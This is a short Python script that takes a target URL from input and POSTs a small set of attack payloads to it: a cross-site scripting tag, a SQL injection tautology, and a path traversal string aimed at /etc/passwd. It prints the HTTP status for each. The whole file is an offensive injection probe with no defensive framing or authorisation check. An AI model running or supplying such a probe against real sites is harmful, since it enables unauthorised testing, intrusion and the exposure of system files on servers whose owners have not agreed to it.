import requests

url = input("Target URL: ")
payloads = ["<script>alert(1)</script>", "' OR '1'='1", "../../etc/passwd"]

for payload in payloads:
    data = {"input": payload}
    r = requests.post(url, data=data)
    print(f"[+] Injected: {payload} - Status: {r.status_code}")